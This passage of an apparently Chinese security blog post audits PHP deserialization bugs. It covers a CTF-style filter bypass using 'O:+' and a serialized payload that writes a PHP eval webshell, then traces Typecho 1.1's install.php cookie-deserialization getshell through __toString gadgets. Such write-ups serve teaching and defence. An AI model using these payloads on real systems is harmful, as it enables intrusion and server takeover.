class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span>(<span class="params"><span class="variable">$file</span> = <span class="literal">null</span>, <span class="variable">$tpl</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$file</span> ?? <span class="variable language_">$this</span>-&gt;cacheFile;</span><br><span class="line">        <span class="variable">$tpl</span> = <span class="variable">$tpl</span> ?? <span class="variable language_">$this</span>-&gt;template;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$tpl</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$this</span>-&gt;template, <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createCache</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Template</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>题目考察对php反序列化函数的利用。在第10行 <strong>loadData()</strong> 函数中，我们发现了 <strong>unserialize</strong> 函数对传入的 <strong>$data</strong> 变量进行了反序列。在反序列化前，对变量内容进行了判断，先不考虑绕过，跟踪一下变量，看看变量是否可控。在代码 <strong>第6行</strong> ，调用了 <strong>loadData()</strong> 函数，<code>$data</code>变量来自于 <strong>__construct()</strong> 构造函数传入的变量。代码第32行，对 <strong>Template</strong> 类进行了实例化，并将 <strong>cookie</strong> 中键为’data’数据作为初始化数据进行传入，<code>$data</code>数据我们可控。开始考虑绕过对传入数据的判断。</p><p>代码 <strong>11行</strong> ，第一个if，截取前两个字符，判断反序列化内容是否为对象，如果为对象，返回为空。php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。</p><p>第二个if判断,匹配 字符串为 &#39;O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-14.png"></p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-15.png"></p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-16.png"></p><p>在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 <strong>yy13</strong> 函数，在 <strong>yy13</strong> 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 <strong>yy17</strong> 函数,如果不是则调用 <strong>yy3</strong> 函数,直接return 0，结束反序列化。接着看 <strong>yy17</strong> 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 <strong>yy20</strong> 函数，第二个判断如果是’+’号则跳转到 <strong>yy19</strong> ，在 <strong>yy19</strong> 中，继续对 <strong>+号</strong> 后面的字符进行判断，如果为数字则跳转到 <strong>yy20</strong> ,如果不是则跳转到 <strong>yy18</strong> ， <strong>y18</strong> 最终跳转到 <strong>yy3</strong> ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。</p><p>绕过了过滤以后，接下来考虑怎样对反序列化进行利用，反序列化本质是将序列化的字符串还原成对应的类实例，在该过程中，我们可控的是序列化字符串的内容，也就是对应类中变量的值。我们无法直接调用类中的函数，但PHP在满足一定的条件下，会自动触发一些函数的调用，该类函数，我们称为魔术方法。通过可控的类变量，触发自动调用的魔术方法，以及魔术方法中存在的可利用点，进而形成反序列化漏洞的利用。</p><p>在代码31行，对象销毁时会调用 <strong>createCache()</strong> 函数，函数将 <code>$template</code> 中的内容放到了 <code>$cacheFile</code> 对应的文件中。 <strong>file_put_contents()</strong> 函数，当文件不存在时，会创建该文件。由此可构造一句话，写入当前路径。</p><p> <code>$cacheFile</code> 和 <code>$template</code> 为类变量，反序列化可控，由此，构造以下反序列化内容，别忘了加’+’号</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-17.png"></p><p>放入cookie需进行URL编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:+<span class="number">8</span>:<span class="string">&quot;Template&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;cacheFile&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;./test.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;template&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[xx]);?&gt;&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>文件成功写入：</p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，选取的是 <strong>Typecho-1.1</strong> 版本，在该版本中，用户可通过反序列化Cookie数据进行前台Getshell。该漏洞出现于 <strong>install.php</strong> 文件 <strong>230行</strong> ，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="variable">$config</span>, <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上图代码 <strong>第3行</strong> ，对Cookie中的数据base64解码以后，进行了反序列化操作，该值可控，接下来看一下代码触发条件。文件几个关键判断如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)</span><br><span class="line">    &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个if判断，可通过GET传递 <strong>finish&#x3D;任意值</strong> 绕过 ，第二if判断是否有GET或者POST传参，并判断Referer是否为空，第四个if判断Referer是否为本站点。紧接着还有判断，如下图：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)) : <span class="meta">?&gt;</span></span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;安装失败！&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;您没有上传 <span class="title">config</span>.<span class="title">inc</span>.<span class="title">php</span> 文件，请检查后再试！&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;重新安装&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">elseif</span> (!<span class="title">Typecho_Cookie</span>::<span class="title">get</span>(&#x27;<span class="title">__typecho_config</span>&#x27;)): ?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;安装完成！&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;您没有进行安装配置，请检查后再试！&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;重新安装&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">else</span> : ?&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个if判断 <strong>$_GET[‘finish’]</strong> 是否设置，然后判断 <strong>config.inc.php文件</strong> 是否存在，安装后已存在，第三个判断cookie中 <strong>__typecho_config</strong> 参数是否为空，不为空。进入else分支。综上，具体构造如下图：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-18.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>反序列化结果存储到 <strong>$config</strong> 变量中，然后将 <strong>$config[‘adapter’]</strong> 和 <strong>$config[‘prefix’]</strong> 作为 <strong>Typecho_Db</strong> 类的初始化变量创建类实例。我们可以在 <strong>var&#x2F;Typecho&#x2F;Db.php</strong> 文件中找到该类构造函数代码，具体如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 构建适配器完整名称 */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 实例化适配器对象 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上图代码 <strong>第6行</strong> ，对传入的 <strong>$adapterName</strong> 变量进行了字符串拼接操作，对于PHP而言，如果 <strong>$adapterName</strong> 类型为对象，则会调用该类 <strong>__toString()</strong> 魔术方法。可作为反序列化的一个触发点，我们全局搜索一下 <strong>__toString()</strong> ，查看是否有可利用的点。实际搜索时，会发现有三个类都定义了 <strong>__toString()</strong> 方法：</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-19.png"></p><ul><li><p>第一处 <strong>var\Typecho\Config.php</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;currentConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 <strong>serialize()</strong> 函数进行序列化操作，会自动触发 <strong>__sleep()</strong> ，如果存在可利用的 <strong>__sleep()</strong> ，则可以进一步利用。</p></li><li><p>第二处 <strong>var\Typecho\Db\Query.php</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; (&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27; VALUES &#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">              <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">              <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                      <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$columns</span>) .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>该方法用于构建SQL语句，并没有执行数据库操作，所以暂无利用价值。</p></li><li><p>第三处<strong>var\Typecho\Feed.php</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          ......</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">              xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">              xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">              xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">              xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">              xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">          <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span 